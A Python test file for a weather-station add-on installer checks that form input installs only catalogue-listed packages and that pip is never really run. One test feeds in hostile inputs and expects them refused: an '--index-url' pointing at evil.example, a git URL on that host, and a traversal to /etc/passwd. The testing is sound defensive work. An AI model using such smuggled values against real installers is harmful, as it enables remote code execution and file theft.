#!/usr/bin/env python3
"""The shop: what may be installed, what may not, and what is here already.

The core ships no driver, so getting one is the first thing a fresh
installation does. That makes this the one page where a form field turns into
a command, and the whole of what is measured here is the fence around it: a
package name is looked up in the catalogue and the URL comes from the entry,
never from the request.

pip is never actually run. Whether pip works is not the question, and a test
that installed something would be measuring somebody's network -- so the
runner is handed in, and what is checked is the command that would have run.

    python tools/addons_test.py
"""

from __future__ import annotations

import json
import re
import sys
import tempfile
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "src"))

from weewx_evo import addons, catalogue  # noqa: E402

failures = 0

CATALOGUE = """
version = 1

[[plugin]]
name = "weewx-evo-ecowitt"
kind = "driver"
provides = "ecowitt"
summary = "Ecowitt custom upload."
repository = "https://github.com/weewx-evo/weewx-evo-ecowitt"
detects = { body = ["PASSKEY="], not_body = ["AMBWeather"] }

[[plugin]]
name = "weewx-evo-acurite"
kind = "driver"
provides = "acurite"
summary = "Acurite bridges."
repository = "https://github.com/weewx-evo/weewx-evo-acurite"
detects = { body = ["mt=", "id="] }

# One entry standing for many boxes, which is the case the `hardware` field
# is for: the summary cannot name thirteen of them and stay one line.
#
# Named for a package no machine has rather than for the real one, and that
# is the same trap twice now: the Docker image these run in has the eight
# real add-ons installed, and an installed add-on is not on the shelf any
# more -- so a row that is checked for has to be one nothing can install
# out from under it.
[[plugin]]
name = "weewx-evo-notonthismachine"
kind = "collector"
provides = "notonthismachine"
summary = "One entry standing for many boxes."
repository = "https://github.com/weewx-evo/weewx-evo-notonthismachine"
hardware = ["Davis Vantage Pro, Pro2, Vue", "ADS WS1"]

[[plugin]]
name = "weewx-evo-push-common"
kind = "library"
provides = ""
summary = "The parts the push protocols share. On its own it does nothing."
repository = "https://github.com/weewx-evo/weewx-evo-push-common"

[[plugin]]
name = "weewx-evo-neverinstalled"
kind = "library"
provides = ""
summary = "A dependency no machine running this test has."
repository = "https://github.com/weewx-evo/weewx-evo-neverinstalled"

[[plugin]]
name = "weewx-evo-elsewhere"
kind = "driver"
provides = "elsewhere"
summary = "One whose repository is outside the organisation."
repository = "https://github.com/someone/else"
"""


class Ran:
    """Stands in for `subprocess.run`, and remembers what it was asked to do."""

    def __init__(self, returncode: int = 0, stderr: str = "") -> None:
        self.calls: list[list[str]] = []
        self.returncode, self.stderr = returncode, stderr

    def __call__(self, command, **kw):
        self.calls.append(list(command))
        return self

    stdout = ""


def check(what: str, got: object, want: object) -> None:
    global failures
    ok = got == want
    tail = "" if ok else f"  (wanted {want!r})"
    print(f"  {'ok  ' if ok else 'FAIL'} {what}: {got!r}{tail}")
    failures += 0 if ok else 1


def _cached(where: Path) -> None:
    (where / catalogue.FILENAME).write_text(
        json.dumps({"when": time.time(), "text": CATALOGUE}), encoding="utf-8")


def only_what_the_catalogue_lists() -> None:
    """The fence. A form field is not a package name until it is looked up."""
    print("\nwhat may be installed")
    with tempfile.TemporaryDirectory(ignore_cleanup_errors=True) as raw:
        where = Path(raw)
        _cached(where)
        # A name that is not in the list makes `install` fetch a fresh one --
        # "not in it" is usually "not in the copy from this morning". Pointed
        # at a closed port so this measures the catalogue written here rather
        # than whatever is on GitHub today, and so that a refusal is still a
        # refusal when the refresh fails.
        was, catalogue.URL = catalogue.URL, "http://127.0.0.1:1/nope"

        ran = Ran()
        check("a listed one goes ahead",
              addons.install("weewx-evo-ecowitt", where, ran), "")
        # The first call: what follows may be a dependency, see below.
        check("with the URL from the entry, not from the caller",
              ran.calls[0][-1],
              "weewx-evo-ecowitt @ https://github.com/weewx-evo/"
              "weewx-evo-ecowitt/archive/main.tar.gz")
        # A tarball rather than `git+`, which makes pip shell out to git --
        # a build tool a station image has no reason to carry, and the first
        # install from the page failed on an image that did not.
        check("as a tarball, so no git is needed",
              "git+" in ran.calls[0][-1], False)
        check("and through this interpreter's own pip",
              ran.calls[0][1:4], ["-m", "pip", "install"])
        # Into the data directory rather than site-packages: the reason the
        # whole thing works in a container.
        check("and into the add-on directory",
              "--target" in ran.calls[0], True)

        # The one that matters. Without the lookup this is `pip install
        # <whatever the form said>`, which is remote code execution with
        # extra steps.
        ran = Ran()
        for tried in ("weewx-evo-ecowitt --index-url http://evil.example",
                      "git+https://evil.example/x",
                      "requests", "", "../../../etc/passwd"):
            problem = addons.install(tried, where, ran)
            check(f"{tried[:34]!r} is refused", bool(problem), True)
        check("and pip was not run once", ran.calls, [])

        # In the catalogue, but pointing somewhere this will not install
        # from. The catalogue is ours, so this should never happen -- and it
        # is the line that stops it becoming an install if it ever does.
        # On GitHub, and still not ours. Everything the catalogue lists is
        # in the organisation, because this is the route with one click and
        # no further question -- a catalogue served from somewhere it should
        # not be cannot turn that click into an install of anything else.
        ran = Ran()
        problem = addons.install("weewx-evo-elsewhere", where, ran)
        check("a listed one outside the organisation is refused",
              "weewx-evo organisation" in problem, True)
        check("and it says which command would install it anyway",
              "--unlisted" in problem, True)
        check("and pip was not run for it", ran.calls, [])
        catalogue.URL = was


def a_dependency_comes_too_and_only_from_the_list() -> None:
    """`--no-deps` is passed, so this has to fetch what a package needs.

    Fetched here rather than left to pip, and that is the fence again: pip
    would resolve whatever a package asked for, from wherever it asked. So a
    dependency is looked up in the catalogue like anything else, and one that
    is not there is named rather than fetched.
    """
    print()
    print("a dependency")
    with tempfile.TemporaryDirectory(ignore_cleanup_errors=True) as raw:
        where = Path(raw)
        _cached(where)
        was = addons._needs
        try:
            # A name no machine can already have: in the Docker image the
            # push protocols are installed, and "it is already here" is a
            # correct answer that measures nothing about fetching.
            addons._needs = lambda package: (
                ["weewx-evo-neverinstalled"] if package == "weewx-evo-ecowitt"
                else [])
            ran = Ran()
            check("installing one that needs a library succeeds",
                  addons.install("weewx-evo-ecowitt", where, ran), "")
            check("and the library was fetched too",
                  [one[-1].split(" @ ")[0] for one in ran.calls],
                  ["weewx-evo-ecowitt", "weewx-evo-neverinstalled"])

            # The same thing, needing something the catalogue does not have.
            addons._needs = lambda package: (
                ["weewx-evo-somethingelse"] if package == "weewx-evo-ecowitt"
                else [])
            ran = Ran()
            problem = addons.install("weewx-evo-ecowitt", where, ran)
            check("one needing something unlisted says so",
                  "not in the add-on list" in problem, True)
            check("and that something was not fetched",
                  [one[-1].split(" @ ")[0] for one in ran.calls],
                  ["weewx-evo-ecowitt"])
        finally:
            addons._needs = was


def the_command_line_may_install_anything() -> None:
    """Who publishes an add-on is not ours to decide.

    The catalogue says what this installation *offers*, and offering is not
    permitting -- so a person on the machine can install from anywhere. The
    page cannot, and that is not a judgement about the package: it is that a
    form field is not a person.
    """
    print()
    print("the command line, with --unlisted")
    with tempfile.TemporaryDirectory(ignore_cleanup_errors=True) as raw:
        where = Path(raw)
        _cached(where)

        ran = Ran()
        check("a git URL nobody listed is installed",
              addons.install_unlisted("git+https://example.org/someone/theirs",
                                      where, ran), "")
        check("as given, with no lookup",
              ran.calls[0][-1], "git+https://example.org/someone/theirs")
        check("and into the add-on directory like anything else",
              "--target" in ran.calls[0], True)

        ran = Ran()
        check("a local path too",
              addons.install_unlisted("./a-directory", where, ran), "")
        check("nothing to install is said rather than run",
              bool(addons.install_unlisted("   ", where, ran)), True)

        # And the page has no way to reach it. `act` takes the verb from the
        # path, and there are two verbs.
        from weewx_evo import adminaddons

        source = Path("src/weewx_evo/adminaddons.py").read_text(
            encoding="utf-8")
        check("the page never calls it",
              "install_unlisted" in source, False)
        check("and an unknown verb is refused",
              bool(adminaddons.act(None, "install_unlisted",
                                   {"package": "x"})), True)


def what_is_installed_disappears_from_the_shelf() -> None:
    """Two lists of one thing, and it must not be in both.

    Reported from the beta: an add-on installed from the page stayed in
    Available, with a button offering to install what was already there.
    `installed()` did not put the add-on directory on `sys.path` itself, so
    it answered with whatever had happened to load a registry earlier in the
    process -- which is a different answer on two requests of the same page.
    """
    print()
    print("what is installed is not offered")
    from weewx_evo import adminaddons

    have = addons.installed()
    if not have:
        # Nothing installed here, so nothing could wrongly be offered. Said
        # rather than passed quietly: a check that measures nothing on this
        # machine must not read like one that measured something.
        print("  ..   no add-on is installed here, so nothing can be in both")
        return

    class FakeAdmin:
        path = Path("evo.toml")
        read_only = False

        def config(self):
            return {}

        @property
        def language(self):
            from weewx_evo import language as language_defs

            return language_defs.get("en")

        def say(self, english: str) -> str:
            return self.language.say(english)

    # The page, not the raw catalogue: the catalogue lists everything by
    # design, and what must not repeat itself is what a reader sees.
    page = adminaddons.overview(FakeAdmin())
    below = page.split("Available", 1)[-1]
    offered_names = re.findall(r"<td><strong>([^<]+)</strong>", below)
    check("nothing installed is offered again",
          sorted(name for name in offered_names if name in have), [])
    check("and what is installed is on the page",
          any(name in page for name in have), True)


def an_update_is_a_string_comparison() -> None:
    """The catalogue carries the version, so the check costs no request.

    It is pulled once a day whatever happens. Fetching a version per add-on
    would be fifteen requests to answer a question nobody asked, on a page
    somebody opened to do something else.
    """
    print()
    print("what is out of date")
    from weewx_evo.addons import _newer

    for later, older, want in (("0.2.0", "0.1.0", True),
                               ("0.10.0", "0.9.0", True),   # not a string sort
                               ("0.1.0", "0.1.0", False),
                               ("0.1.0", "0.2.0", False),
                               ("1.0", "1.0rc1", False)):   # unorderable
        check(f"{later} newer than {older}", _newer(later, older), want)

    # An entry with no version says nothing rather than guessing, because
    # "up to date" about something that is not is worse than silence.
    with tempfile.TemporaryDirectory(ignore_cleanup_errors=True) as raw:
        where = Path(raw)
        _cached(where)
        was, catalogue.URL = catalogue.URL, "http://127.0.0.1:1/nope"
        try:
            # The test catalogue declares no versions at all.
            check("nothing is offered as an update", addons.updatable(where), {})
        finally:
            catalogue.URL = was


def what_pip_says_is_reported() -> None:
    """A failure has to reach the page, and as the sentence pip ended on."""
    print("\nwhen pip refuses")
    with tempfile.TemporaryDirectory(ignore_cleanup_errors=True) as raw:
        where = Path(raw)
        _cached(where)
        ran = Ran(returncode=1, stderr="Collecting …\nERROR: no such ref")
        problem = addons.install("weewx-evo-ecowitt", where, ran)
        check("it fails", bool(problem), True)
        # The tail, not the screen of progress above it.
        check("with the line that says why",
              problem.endswith("ERROR: no such ref"), True)

    with tempfile.TemporaryDirectory(ignore_cleanup_errors=True) as raw:
        where = Path(raw)
        _cached(where)

        def explodes(*a, **kw):
            raise OSError("pip is not there")

        problem = addons.install("weewx-evo-ecowitt", where, explodes)
        check("and a pip that cannot be run at all is a sentence too",
              "pip is not there" in problem, True)


def removing_asks_what_is_here() -> None:
    """Not the catalogue: what may be removed is what is installed."""
    print("\nremoving")
    ran = Ran()
    check("something not installed here", bool(addons.remove("weewx-evo-x", None, ran)),
          True)
    check("and pip was not run", ran.calls, [])


def what_is_installed_is_read_from_the_entry_points() -> None:
    """What a package registers, not what a catalogue says it registers.

    Two different facts. A package that is installed and declares nothing
    weewx-evo reads is not an add-on of ours, and one whose catalogue entry
    is out of date still provides whatever it provides.
    """
    print("\nwhat is installed")
    have = addons.installed()
    check("every entry names the package it came from",
          all(one.package for one in have.values()), True)
    check("and each of them has a version",
          all(one.version for one in have.values()), True)
    for one in have.values():
        for group, _name in one.provides:
            if group not in addons.GROUPS:
                check(f"{one.package}: unexpected group", group, "(one of ours)")
    print(f"  ..   {len(have)} installed here: "
          f"{', '.join(sorted(have)) or '(none)'}")


def the_page_renders_without_a_network(where: Path) -> None:
    """Offline is a state. An empty shop must say so rather than look empty."""
    print("\nthe page")
    from weewx_evo import adminaddons

    class FakeAdmin:
        path = where / "evo.toml"
        read_only = False

        def config(self):
            return {"live_db": "data/live.sdb"}

        @property
        def language(self):
            from weewx_evo import language as language_defs

            return language_defs.get("en")

        def say(self, english: str) -> str:
            return self.language.say(english)

    admin = FakeAdmin()
    # No cached catalogue and nothing reachable. Pointed at a closed port
    # rather than trusting the machine to be offline: this runs in Docker
    # with no network and on a laptop that has one, and a check that only
    # measures on one of them is a check that stops measuring.
    was, catalogue.URL = catalogue.URL, "http://127.0.0.1:1/nope"
    try:
        page = adminaddons.overview(admin)
    finally:
        catalogue.URL = was
    check("it renders", "<section" in page, True)
    check("and says the list could not be fetched",
          "could not be fetched" in page, True)
    check("naming the way in that needs no network",
          "driver install" in page, True)

    _cached(Path(where))
    page = adminaddons.overview(admin)
    check("with a cached list, the add-ons are on it",
          "weewx-evo-ecowitt" in page, True)
    check("with a button that names the package",
          'value="weewx-evo-ecowitt"' in page, True)

    # The boxes, on the row. One entry stands for the thirteen drivers WeeWX
    # ships, and somebody looking for an add-on knows what is on their pole
    # and nothing else -- so the row holding the answer to "does it do my
    # Vantage" has to say Vantage, or a search of the page finds nothing.
    check("and the hardware an entry names is on the row",
          "Davis Vantage Pro, Pro2, Vue" in page, True)
    # Said as one line rather than as a word next to the package name: a row
    # is a row, and a list of nine model names down the first column pushes
    # the button off the screen.
    check("and it is one line under the summary",
          page.count('class="help hardware"'), 1)
    # Nested forms do not exist in HTML: the browser drops the inner tag and
    # keeps its closing one, which closes the outer form early. Every row
    # here has a form in it.
    depth, worst = 0, 0
    for piece in page.split("<form")[1:]:
        depth += 1
        worst = max(worst, depth)
        depth -= piece.count("</form>")
    check("and no form inside another", worst, 1)


def a_read_only_page_offers_no_buttons(where: Path) -> None:
    """`weewx-evo admin --read-only` must not be able to install anything."""
    print("\nread-only")
    from weewx_evo import adminaddons

    class Locked:
        path = where / "evo.toml"
        read_only = True

        def config(self):
            return {}

        @property
        def language(self):
            from weewx_evo import language as language_defs

            return language_defs.get("en")

        def say(self, english: str) -> str:
            return self.language.say(english)

    page = adminaddons.overview(Locked())
    check("the add-ons are listed", "weewx-evo-ecowitt" in page, True)
    check("and there is nothing to press", "<button" in page, False)


def main() -> int:
    only_what_the_catalogue_lists()
    a_dependency_comes_too_and_only_from_the_list()
    the_command_line_may_install_anything()
    what_is_installed_disappears_from_the_shelf()
    an_update_is_a_string_comparison()
    what_pip_says_is_reported()
    removing_asks_what_is_here()
    what_is_installed_is_read_from_the_entry_points()
    with tempfile.TemporaryDirectory(ignore_cleanup_errors=True) as raw:
        # `_where` reads the running settings; with none, it is the working
        # directory, so the test runs from one of its own.
        import os

        was = os.getcwd()
        os.chdir(raw)
        try:
            the_page_renders_without_a_network(Path(raw))
            a_read_only_page_offers_no_buttons(Path(raw))
        finally:
            os.chdir(was)

    print()
    if failures:
        print(f"{failures} check(s) failed")
        return 1
    print("an add-on is installed by name, and only a name from the list")
    return 0


if __name__ == "__main__":
    sys.exit(main())
